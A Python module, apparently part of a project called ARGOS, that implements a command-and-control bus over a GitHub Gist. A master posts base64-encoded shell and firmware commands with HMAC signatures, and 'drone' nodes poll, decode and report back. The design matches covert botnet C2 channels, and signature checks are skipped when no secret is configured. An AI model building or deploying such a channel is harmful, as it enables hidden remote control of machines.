"""
argos_ghost_protocol.py
-----------------------
Ghost bus: C2 шина ARGOS Роя через GitHub Gist.
Реализует формат v1.20.5:
  ARGOS_DIRECTIVE:<base64_cmd>:<ts>       — обычная shell-команда
  ARGOS_FLASH_CMD:<base64_cmd>:<ts>       — IoT/прошивочная команда
  DRONE_LOG:<drone_id>:<base64_msg>:<ts> — отчёт дочерней ноды
Master -> Gist -> Drone polling 30s -> execution -> Gist log.
"""
from __future__ import annotations

import base64
import hashlib
import hmac as _hmac
import json
import os
import time
from dataclasses import dataclass
from typing import Optional

import requests

GHOST_GIST_ID = os.getenv("ARGOS_GHOST_GIST", "")
GITHUB_TOKEN = os.getenv("GHOST_GITHUB_TOKEN", os.getenv("GITHUB_TOKEN", ""))
# Shared secret for HMAC-SHA256 command signing — must be same on all nodes.
# Generate: python3 -c "import secrets; print(secrets.token_hex(32))"
GHOST_SIGN_SECRET = os.getenv("GHOST_SIGN_SECRET", "").encode("utf-8")
SYS_LOG_NAME = "sys_logs.txt"


@dataclass
class BroadcastResult:
    ok: bool
    gist_id: Optional[str]
    error: Optional[str] = None


class GhostBus:
    """Шина broadcast-приказов и сбора логов дронов."""

    def __init__(self, gist_id: Optional[str] = None, token: Optional[str] = None):
        self.gist_id = gist_id or GHOST_GIST_ID
        self.token = token or GITHUB_TOKEN
        self.base_url = f"https://api.github.com/gists/{self.gist_id}"
        self.headers = {"Authorization": f"token {self.token}"} if self.token else {}

    def _b64(self, text: str) -> str:
        return base64.b64encode(text.encode("utf-8")).decode("ascii")

    def _decode(self, b64: str) -> str:
        return base64.b64decode(b64.encode("ascii")).decode("utf-8", errors="ignore")

    def _sign(self, label: str, cmd_b64: str, ts: str) -> str:
        secret = GHOST_SIGN_SECRET
        if not secret:
            return "nosig"
        msg = f"{label}:{cmd_b64}:{ts}".encode("utf-8")
        return _hmac.new(secret, msg, hashlib.sha256).hexdigest()[:32]

    def _verify(self, label: str, cmd_b64: str, ts: str, sig: str) -> bool:
        if not GHOST_SIGN_SECRET:
            return True  # no secret configured — pass-through (warn on first use)
        if sig == "nosig":
            return False  # remote has no secret; reject
        expected = self._sign(label, cmd_b64, ts)
        return _hmac.compare_digest(expected, sig)

    def _patch(self, files: dict) -> BroadcastResult:
        if not self.gist_id:
            return BroadcastResult(ok=False, gist_id=None, error="ARGOS_GHOST_GIST not set")
        try:
            r = requests.patch(self.base_url, headers=self.headers, json={"files": files}, timeout=15)
            r.raise_for_status()
            return BroadcastResult(ok=True, gist_id=r.json().get("id", self.gist_id))
        except Exception as e:
            return BroadcastResult(ok=False, gist_id=self.gist_id, error=str(e))

    def broadcast(self, command: str, label: str = "DIRECTIVE") -> BroadcastResult:
        ts = str(int(time.time()))
        cmd_b64 = self._b64(command)
        sig = self._sign(label, cmd_b64, ts)
        payload = f"ARGOS_{label}:{cmd_b64}:{ts}:{sig}:"
        return self._patch({SYS_LOG_NAME: {"content": payload}})

    def drone_log(self, drone_id: str, message: str) -> BroadcastResult:
        ts = str(int(time.time()))
        log_name = f"drone_{drone_id}.log"
        payload = f"[{drone_id}] {message} | TS: {ts}"
        return self._patch({log_name: {"content": payload}})

    def read_commands(self, last_processed_ts: int = 0):
        if not self.gist_id:
            return [], last_processed_ts
        try:
            r = requests.get(self.base_url, headers=self.headers, timeout=15)
            r.raise_for_status()
            files = r.json().get("files", {})
            sys_log = files.get(SYS_LOG_NAME, {}).get("content", "")
            commands = []
            for tag in ("ARGOS_DIRECTIVE:", "ARGOS_FLASH_CMD:"):
                if tag not in sys_log:
                    continue
                parts = sys_log.split(tag)[1].split(":")
                if len(parts) < 3:
                    continue
                cmd_b64, ts_raw, sig = parts[0], parts[1], parts[2]
                try:
                    ts = int(ts_raw)
                except ValueError:
                    continue
                label = tag[len("ARGOS_"):-1]
                if not self._verify(label, cmd_b64, ts_raw, sig):
                    continue  # reject unsigned or tampered command
                if ts > last_processed_ts:
                    command = self._decode(cmd_b64)
                    commands.append({"type": tag[:-1].lower().replace("argos_", ""), "command": command, "ts": ts, "raw_tag": tag})
                    last_processed_ts = max(last_processed_ts, ts)
            return commands, last_processed_ts
        except Exception:
            return [], last_processed_ts
